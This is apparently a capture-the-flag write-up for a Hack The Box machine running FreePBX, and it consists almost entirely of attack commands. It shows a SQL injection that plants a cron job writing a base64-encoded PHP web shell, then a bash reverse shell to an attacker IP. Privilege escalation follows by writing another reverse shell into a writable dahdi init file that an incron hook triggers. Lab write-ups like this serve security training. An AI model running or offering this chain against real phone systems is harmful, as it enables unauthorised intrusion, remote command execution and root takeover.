#easy #htb
# Exploitation

- SQL injection: adds `crontab` that creates a malicious `php` file

```bash
curl -X POST "http://connected.htb/admin/ajax.php?module=FreePBX\\modules\\endpoint\\ajax&command=model&template=x&model=model" \
      --data-urlencode "brand=x';INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','wt-shell3','echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==|base64 -d >/var/www/html/wt-shell3.php',NULL,'* * * * *',30,1,1)-- "
```

```bash
curl -ik "https://connected.htb/wt-shell3.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/IP/4444+0>%261'"
```

# Privilege escalation

```bash
cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

- if we modify `/var/spool/asterisk/sysadmin/dahdi_restart` **dahdi** resets and executes `/etc/dahdi/init.conf`

```bash
find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze" | head -20
/etc/dahdi/init.conf    # we can modify /etc/dahdi/init.conf
```

```bash
echo "bash -i >& /dev/tcp/IP/4445 0>&1" > /etc/dahdi/init.conf
```

Attacker:
```bash
nc -nlvp 4445
```

Victim:
```bash
$ echo "something" > /var/spool/asterisk/sysadmin/dahdi_restart
```
